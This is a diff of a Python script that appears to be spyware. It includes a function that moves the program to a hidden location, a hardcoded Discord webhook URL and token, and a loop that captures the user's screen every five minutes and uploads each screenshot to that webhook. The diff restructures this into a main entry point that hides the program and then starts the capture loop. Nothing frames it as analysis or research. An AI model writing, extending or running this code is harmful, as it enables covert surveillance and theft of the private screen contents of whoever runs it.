@@ -73,9 +73,6 @@ def move_to_hidden_location():
             return False  # Don't exit, continue running from current location
 
 
-move_to_hidden_location()
-
-
 
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1525081864094613615/4DkAojzJaoqsbolWR2E59IVwWeZY21CVr4-eNcnvXWB2nAKad4wpQ3mZVddNnNlw8pV7"
 FILE_PATH = os.path.join(os.path.expanduser("~"), "screenshot.png")
@@ -93,14 +90,21 @@ def send_screenshot():
         print(f"[!] Failed to send screenshot: {e}")
 
 
-while True:
-    try:
-        screenshot = pyautogui.screenshot()
-        screenshot.save(FILE_PATH)
-        print("Saved!")
+def start_screenshot_loop():
+    while True:
+        try:
+            screenshot = pyautogui.screenshot()
+            screenshot.save(FILE_PATH)
+            print("Saved!")
 
-        send_screenshot()
-    except Exception as e:
-        print(f"[!] Screenshot error: {e}")
+            send_screenshot()
+        except Exception as e:
+            print(f"[!] Screenshot error: {e}")
 
-    time.sleep(5 * 60)
+        time.sleep(5 * 60)
+
+
+if __name__ == "__main__":
+    move_to_hidden_location()
+    start_screenshot_loop()
+
